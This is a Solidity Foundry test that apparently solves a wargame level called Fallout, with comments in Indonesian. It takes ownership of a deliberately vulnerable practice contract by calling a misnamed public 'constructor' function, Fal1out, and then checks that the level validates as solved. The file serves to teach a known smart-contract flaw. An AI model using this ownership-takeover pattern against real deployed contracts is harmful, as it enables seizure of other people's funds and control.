// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

// Interaksi lewat interface + deployCode: kontrak level 0.6 tidak bisa
// di-import langsung ke file test 0.8 (konflik versi solc dalam satu unit
// kompilasi), dan forge-std Test.sol tidak bisa dikompilasi dengan solc 0.6.
interface IFallout {
    function Fal1out() external payable;
    function owner() external view returns (address payable);
}

interface IFalloutFactory {
    function createInstance(address _player) external payable returns (address);
    function validateInstance(address payable _instance, address _player) external returns (bool);
}

contract FalloutSolve is Test {
    IFalloutFactory factory;
    IFallout instance;
    address player = address(0xBEEF);

    function setUp() public {
        factory = IFalloutFactory(deployCode("FalloutFactory.sol:FalloutFactory"));
        instance = IFallout(factory.createInstance(player));
    }

    function testInit() public {
        assertFalse(factory.validateInstance(payable(address(instance)), player));
    }

    function testSolve() public {
        vm.startPrank(player);
        // "Constructor" bernama Fal1out (angka 1, bukan huruf l) — di Solidity
        // 0.6 itu fungsi publik biasa yang bisa dipanggil siapa saja.
        instance.Fal1out{value: 0}();
        vm.stopPrank();
        assertEq(instance.owner(), player);
        assertTrue(factory.validateInstance(payable(address(instance)), player));
    }
}
